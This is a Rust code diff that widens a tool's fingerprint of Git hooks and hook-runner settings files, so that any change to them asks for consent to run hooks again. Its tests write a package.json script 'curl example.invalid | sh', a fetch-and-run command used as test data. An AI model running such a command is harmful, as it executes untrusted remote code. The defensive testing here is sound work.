@@ -9,8 +9,12 @@
 //!
 //! A "run them" answer holds for the hooks as they were then: it keeps a
 //! fingerprint of the hooks folder (every file's name, mode and content,
-//! and for husky the scripts its stubs run), and any change, such as an
-//! edited or added hook, asks again.
+//! and for husky the scripts its stubs run) and of the settings files of
+//! the common hook runners (`package.json`, `.pre-commit-config.yaml`,
+//! `lefthook.yml` …), and any change, such as an edited or added hook,
+//! asks again. It is checked again right before Git runs the hooks. What
+//! the hooks start in turn (the project's tests behind `npm test`, a
+//! Makefile) is not part of it.
 use crate::store::{keys, Store};
 use anyhow::Result;
 use serde::{Deserialize, Serialize};
@@ -29,9 +33,32 @@ pub const COMMIT_HOOKS: &[&str] = &[
     "pre-auto-gc",
 ];
 
-/// Most files the fingerprint reads, and most bytes of each.
+/// Most files the fingerprint reads, and most bytes of each; files past
+/// that count by their metadata, which any change to them updates.
 const MAX_FINGERPRINT_FILES: usize = 500;
 const MAX_FINGERPRINT_BYTES: u64 = 4 * 1024 * 1024;
+
+/// Settings files at the top of the working tree that decide what the
+/// common hook runners run: pre-commit, lefthook, husky and lint-staged
+/// (`package.json` scripts and settings), simple-git-hooks and commitlint.
+fn runner_settings(name: &str) -> bool {
+    name == "package.json"
+        || [
+            ".pre-commit-config.",
+            "lefthook",
+            ".lefthook",
+            ".lintstagedrc",
+            "lint-staged.config.",
+            ".huskyrc",
+            "husky.config.",
+            ".simple-git-hooks",
+            "simple-git-hooks.",
+            "commitlint.config.",
+            ".commitlintrc",
+        ]
+        .iter()
+        .any(|prefix| name.starts_with(prefix))
+}
 
 #[derive(Clone, Debug, PartialEq, Eq, Serialize)]
 pub struct Hook {
@@ -77,10 +104,10 @@ async fn git_line(workspace: &Path, args: &[&str]) -> Option<String> {
     (output.status.success() && !text.is_empty()).then_some(text)
 }
 
-/// The folder Git would run hooks from: `core.hooksPath` when set (`~`
-/// expanded as Git does, relative paths from the top of the working tree),
-/// else the repository's `hooks` folder.
-async fn hooks_dir(workspace: &Path) -> Option<PathBuf> {
+/// The top of the working tree, and the folder Git would run hooks from:
+/// `core.hooksPath` when set (`~` expanded as Git does, relative paths from
+/// the top of the working tree), else the repository's `hooks` folder.
+async fn hooks_dir(workspace: &Path) -> Option<(PathBuf, PathBuf)> {
     let top = PathBuf::from(git_line(workspace, &["rev-parse", "--show-toplevel"]).await?);
     if let Some(configured) = git_line(
         workspace,
@@ -89,11 +116,12 @@ async fn hooks_dir(workspace: &Path) -> Option<PathBuf> {
     .await
     {
         let path = PathBuf::from(&configured);
-        return Some(if path.is_absolute() {
+        let dir = if path.is_absolute() {
             path
         } else {
             top.join(path)
-        });
+        };
+        return Some((top, dir));
     }
     let hooks = PathBuf::from(
         git_line(
@@ -102,12 +130,12 @@ async fn hooks_dir(workspace: &Path) -> Option<PathBuf> {
         )
         .await?,
     );
-    Some(hooks)
+    Some((top, hooks))
 }
 
 /// The project's hooks among `names` that Git would actually run.
 pub async fn found(workspace: &Path, names: &[&str]) -> Vec<Hook> {
-    let Some(dir) = hooks_dir(workspace).await else {
+    let Some((_, dir)) = hooks_dir(workspace).await else {
         return Vec::new();
     };
     let mut hooks = Vec::new();
@@ -152,11 +180,46 @@ pub async fn found(workspace: &Path, names: &[&str]) -> Vec<Hook> {
     hooks
 }
 
-/// Feed a folder's files (path, whether it runs, size and content) into
-/// `hasher`, and with `deeper` those of its subfolders. A symbolic link
-/// counts as what it points to, as Git runs it.
-fn hash_folder(folder: &Path, deeper: bool, hasher: &mut Sha256, files: &mut usize) {
+/// Feed one file (path, whether it runs, size and content) into `hasher`.
+/// Past [`MAX_FINGERPRINT_FILES`] its content is not read: its inode and
+/// change time stand for it (every write updates the change time, and
+/// unlike the modification time a program cannot set it back).
+fn hash_file(path: &Path, meta: &std::fs::Metadata, hasher: &mut Sha256, files: &mut usize) {
     use std::io::Read;
+    hasher.update(path.as_os_str().as_encoded_bytes());
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        hasher.update((meta.permissions().mode() & 0o111).to_le_bytes());
+    }
+    hasher.update(meta.len().to_le_bytes());
+    if *files >= MAX_FINGERPRINT_FILES {
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::MetadataExt;
+            hasher.update(meta.dev().to_le_bytes());
+            hasher.update(meta.ino().to_le_bytes());
+            hasher.update(meta.ctime().to_le_bytes());
+            hasher.update(meta.ctime_nsec().to_le_bytes());
+        }
+        #[cfg(not(unix))]
+        if let Ok(modified) = meta.modified() {
+            hasher.update(format!("{modified:?}").as_bytes());
+        }
+        return;
+    }
+    *files += 1;
+    let mut content = Vec::new();
+    if let Ok(file) = std::fs::File::open(path) {
+        let _ = file.take(MAX_FINGERPRINT_BYTES).read_to_end(&mut content);
+    }
+    hasher.update(Sha256::digest(&content));
+}
+
+/// Feed a folder's files into `hasher` ([`hash_file`]), and with `deeper`
+/// those of its subfolders. A symbolic link counts as what it points to,
+/// as Git runs it.
+fn hash_folder(folder: &Path, deeper: bool, hasher: &mut Sha256, files: &mut usize) {
     hasher.update(folder.as_os_str().as_encoded_bytes());
     hasher.update([0]);
     let Ok(entries) = std::fs::read_dir(folder) else {
@@ -173,32 +236,18 @@ fn hash_folder(folder: &Path, deeper: bool, hasher: &mut Sha256, files: &mut usi
             if deeper {
                 hash_folder(&path, false, hasher, files);
             }
-            continue;
+        } else if meta.is_file() {
+            hash_file(&path, &meta, hasher, files);
         }
-        if !meta.is_file() || *files >= MAX_FINGERPRINT_FILES {
-            continue;
-        }
-        *files += 1;
-        hasher.update(path.as_os_str().as_encoded_bytes());
-        #[cfg(unix)]
-        {
-            use std::os::unix::fs::PermissionsExt;
-            hasher.update((meta.permissions().mode() & 0o111).to_le_bytes());
-        }
-        hasher.update(meta.len().to_le_bytes());
-        let mut content = Vec::new();
-        if let Ok(file) = std::fs::File::open(&path) {
-            let _ = file.take(MAX_FINGERPRINT_BYTES).read_to_end(&mut content);
-        }
-        hasher.update(Sha256::digest(&content));
     }
 }
 
 /// What an answer to run the hooks is tied to: the hooks folder, the files
-/// in it and its subfolders, and for husky (`core.hooksPath` is
-/// `.husky/_`) the scripts in the folder above, which its stubs run.
+/// in it and its subfolders, for husky (`core.hooksPath` is `.husky/_`)
+/// the scripts in the folder above, which its stubs run, and the hook
+/// runners' settings files ([`runner_settings`]).
 pub async fn fingerprint(workspace: &Path) -> String {
-    let Some(dir) = hooks_dir(workspace).await else {
+    let Some((top, dir)) = hooks_dir(workspace).await else {
         return String::new();
     };
     let mut hasher = Sha256::new();
@@ -207,6 +256,22 @@ pub async fn fingerprint(workspace: &Path) -> String {
     if dir.file_name().is_some_and(|name| name == "_") {
         if let Some(parent) = dir.parent() {
             hash_folder(parent, false, &mut hasher, &mut files);
+        }
+    }
+    hasher.update([0]);
+    let mut settings: Vec<_> = std::fs::read_dir(&top)
+        .into_iter()
+        .flatten()
+        .flatten()
+        .filter(|entry| runner_settings(&entry.file_name().to_string_lossy()))
+        .collect();
+    settings.sort_by_key(|entry| entry.file_name());
+    for entry in settings {
+        let path = entry.path();
+        if let Ok(meta) = std::fs::metadata(&path) {
+            if meta.is_file() {
+                hash_file(&path, &meta, &mut hasher, &mut files);
+            }
         }
     }
     format!("{:x}", hasher.finalize())
@@ -453,6 +518,58 @@ mod tests {
         )
         .unwrap();
         changed(&mut seen, fingerprint(project).await);
+        // What the hook runners run is set in files an ordinary edit
+        // changes: `npm test` is a package.json script.
+        std::fs::write(
+            project.join("package.json"),
+            r#"{"scripts":{"test":"jest"}}"#,
+        )
+        .unwrap();
+        changed(&mut seen, fingerprint(project).await);
+        std::fs::write(
+            project.join("package.json"),
+            r#"{"scripts":{"test":"curl example.invalid | sh"}}"#,
+        )
+        .unwrap();
+        changed(&mut seen, fingerprint(project).await);
+        for name in [
+            ".pre-commit-config.yaml",
+            "lefthook.yml",
+            ".lintstagedrc.json",
+            "lint-staged.config.mjs",
+        ] {
+            std::fs::write(project.join(name), "entry: sh -c 'exit 0'\n").unwrap();
+            changed(&mut seen, fingerprint(project).await);
+        }
+        // Other project files are not part of it.
+        let now = fingerprint(project).await;
+        std::fs::write(project.join("README.md"), "# Project\n").unwrap();
+        std::fs::create_dir_all(project.join("src")).unwrap();
+        std::fs::write(project.join("src/package.json"), "{}").unwrap();
+        assert_eq!(fingerprint(project).await, now);
+    }
+
+    /// Filling the hooks folder past the files read in full does not hide
+    /// later changes to the hooks.
+    #[tokio::test]
+    async fn hooks_past_the_files_read_in_full_still_count() {
+        let dir = tempfile::tempdir().unwrap();
+        let project = dir.path();
+        git(project, &["init", "-q"]);
+        let hooks = project.join(".git/hooks");
+        std::fs::create_dir_all(hooks.join("0")).unwrap();
+        for i in 0..MAX_FINGERPRINT_FILES + 5 {
+            std::fs::write(hooks.join(format!("0/{i:04}")), "filler\n").unwrap();
+        }
+        runnable(&hooks.join("pre-commit"), "#!/bin/sh\nnpm test\n");
+        let first = fingerprint(project).await;
+        assert_eq!(first, fingerprint(project).await, "stable");
+        // The same size, in place.
+        let edited = "#!/bin/sh\ncurl x.y\n";
+        assert_eq!(edited.len(), "#!/bin/sh\nnpm test\n".len());
+        std::thread::sleep(std::time::Duration::from_millis(20));
+        std::fs::write(hooks.join("pre-commit"), edited).unwrap();
+        assert_ne!(first, fingerprint(project).await);
     }
 
     #[test]
